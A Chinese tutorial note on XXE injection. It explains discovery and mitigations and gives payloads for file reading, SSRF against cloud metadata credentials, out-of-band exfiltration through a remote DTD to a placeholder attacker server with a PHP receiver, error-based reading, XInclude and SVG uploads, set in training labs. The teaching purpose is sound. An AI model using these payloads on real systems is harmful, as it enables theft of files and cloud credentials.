---
title: XML&XXE&无回显带外&SSRF元数据&DTD实体&OOB盲注&文件拓展&复盘
published: 2026-07-08
description: XXE漏洞的核心知识点，包括XML与HTML的区别、漏洞产生原理、黑盒白盒的挖掘方法，以及文件读取、通过 XXE 漏洞来实现 SSRF 攻击、外部实体引用、无回显带外攻击等利用方式，同时涉及XInclude绕过、SVG图像解析等
tags:
  - Web攻防
  - XML
category: 网络安全
draft: false
---

# 知识点

1. WEB攻防-XML&XXE-注入原理&四大分类
2. WEB攻防-XML&XXE-文件读取&SSRF&实体引用
3. WEB攻防-XML&XXE-无回显&升级拓展&挖掘思路

# 详细点

XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。等同于JSON传输。

XML与HTML 的主要差异：

XML 被设计为传输和存储数据，其焦点是数据的内容。

HTML 被设计用来显示数据，其焦点是数据的外观。

HTML 旨在显示信息 ，而XML旨在传输存储信息。

**XXE漏洞XML External Entity Injection**，即xml外部实体注入漏洞：XXE漏洞发生在应用程序解析XML输入时，没禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网扫描、攻击内网等危害。

## XXE黑盒发现

两类：

-数据包的测试

-功能点的测试

1、获取得到Content-Type或数据类型为xml时，尝试xml语言payload进行测试

2、不管获取的Content-Type类型或数据传输类型，均可尝试修改后提交测试xxe

3、XXE不仅在数据传输上可能存在漏洞，同样在文件上传引用插件解析或预览也会造成文件中的XXE Payload被执行

## XXE白盒发现

1、可通过应用功能追踪代码定位审计

2、可通过脚本特定函数搜索定位审计

3、可通过伪协议玩法绕过相关修复等

## XXE修复防御方案

### 方案1-禁用外部实体

PHP:

libxml_disable_entity_loader(true);

JAVA:

DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);

Python：

from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))

### 方案2-过滤用户提交的XML数据

```
过滤关键词：<!DOCTYPE和<!ENTITY，或者SYSTEM和PUBLIC
```

# 利用

## 文件读取：

抓包修改

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

## SSRF&配合元数据

条件：存在XXE注入的云服务器应用

其中的地址为元数据地址，而元数据后期课程才会提到

**不同云厂商的实例元数据地址各不相同，通常只能在实例内部访问，用于获取实例ID、IP、MAC、主机名等信息。**

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>
&xxe;
</productId><storeId>1</storeId></stockCheck>
```

## 外部引用实体dtd

```
file.dtd
<!ENTITY send SYSTEM "file:///c:/c.txt">
```

```
<?xml version="1.0" ?>
<!DOCTYPE test [
    <!ENTITY % file SYSTEM "http://xiaodi8.com/file.dtd">
%file;
]>
<user><username>&send;</username><password>xiaodi</password></user>
```

也可以直接在数据包写入`<!ENTITY send SYSTEM "file:///c:/c.txt">` 之后在username或者password字段修改为`%send;`

但是这样做的目的是考虑到

实战中存在的过滤以及不回显的问题

## 无回显利用

1、带外测试

```
<?xml version="1.0" ?>
<!DOCTYPE test [
    <!ENTITY % file SYSTEM "http://xiaodi8.dnslog.cn">
%file;
]>
<user><username>xiaodi</username><password>xiaodi</password></user>
```

2、外部引用实体dtd配合带外

test.dtd:

```
<!ENTITY % all "<!ENTITY send SYSTEM 'http://攻击者服务器/get.php?file=%file;'>">
```


```
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "file:///c:/c.txt">
<!ENTITY % remote SYSTEM "http://攻击者服务器/test.dtd">
%remote;
%all;
]>
<user><username>&send;</username><password>xiaodi</password></user>
```

get.php:

```
<?php
$data=$_GET['file'];
$myfile = fopen("file.txt", "w+");
fwrite($myfile, $data);
fclose($myfile);
?>
```

执行逻辑顺序：

```
test.dtd->all->send->get.php?file=%file->file:///c:/c.txt

http://攻击者服务器/get.php?file=读取的内网数据
```

3、外部引用实体dtd配合错误解析

test.dtd:

这是一个报错的payload，利用目标服务器报错解析来读取文件内容。

内容写入到BURP靶场提供的可利用的攻击者服务器

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

数据包中修改为：

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0ab2006f03dce8a4803dfde101f3007d.exploit-server.net/exploit"> %xxe;]>
```

# 升级拓展

## xinclude利用

XInclude 是一种让你能把多个独立的 XML 文件像拼积木一样“动态组合”成一个大 XML 文档的标准方法。它通过在主文件里放置特殊的“包含指令”（<xi:include>），告诉 XML 处理器在需要的时候去自动加载并插入指定文件的内容。这样做的主要好处是让大型 XML 文档更容易编写、维护和复用。

通俗解释就是分出许多个小模块，比如c1.xml、c2.xml等等，然后有一个主模块main.xml，在主模块使用包含标签`xi:include`来调用其他小模块中的内容。

一些应用程序接收客户端提交的数据，在服务器端将其嵌入到XML文档中，然后解析该文档，所以利用xinclude嵌套进去执行

在抓到数据包时，content-type或者具体数据没有明显的xml特征，只出现了类似普通格式数据：`productId=1&storeId=1`，在其中任意一个修改为payload

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## SVG图像解析（docx等）

一些应用程序接收解析文件，可以使用基于XML的格式的例子有DOCX这样的办公文档格式和SVG这样的图像格式进行测试

创建一个svg文件：

```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

在只允许svg等类型格式的条件下进行

一些网站在上传成功之后会对svg文件做一个解析，在图像处就能看到结果

## 见图

基于XML的Web服务： SOAP、REST和RPC API这些接收和处理XML格式

导入/导出功能： 任何以 XML 格式传输数据的进出口

RSS/Atom 订阅处理器： 订阅功能也可能隐藏着 XXE 漏洞。

文档查看器/转换器： 处理DOCX、XLSX等XML 格式文档的功能

文件上传处理 XML： 比如SVG图像处理器，上传图片也可能中招！

<!--

#复盘

SRC报告

http://web.jarvisoj.com:9882/

https://mp.weixin.qq.com/s/5iPoqsWpYfQmr0ExcJYRwg